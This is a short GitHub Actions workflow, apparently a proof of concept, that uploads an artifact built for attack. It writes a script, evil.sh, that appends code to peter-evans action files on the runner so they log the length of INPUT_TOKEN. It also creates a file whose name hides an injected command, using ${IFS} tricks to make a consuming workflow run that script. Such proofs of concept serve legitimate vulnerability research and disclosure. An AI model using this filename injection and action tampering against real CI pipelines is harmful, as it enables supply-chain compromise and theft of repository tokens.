name: Tests

on:
  workflow_dispatch:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: make artifact
        run: |
          mkdir -p out
          printf 'benign content\n' > out/readme.txt
          cat > out/evil.sh <<'SH'
          #!/bin/bash
          echo "PREPARE_RAN_AS $(id -un)"
          for f in $(find /home/runner/work/_actions/peter-evans -name index.js 2>/dev/null); do
            echo "PATCHING $f"
            printf '\nconsole.log("LEAK_INPUT_TOKEN len="+(process.env.INPUT_TOKEN||"none").length);\n' >> "$f"
          done
          SH
          printf 'x' > "out/readme.txt;P=\$(node\${IFS}-e\${IFS}'process.stdout.write(String.fromCharCode(47))');bash\${IFS}\${P}tmp\${P}content\${P}content\${P}evil.sh;#.txt"
          ls -1 out
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: out/
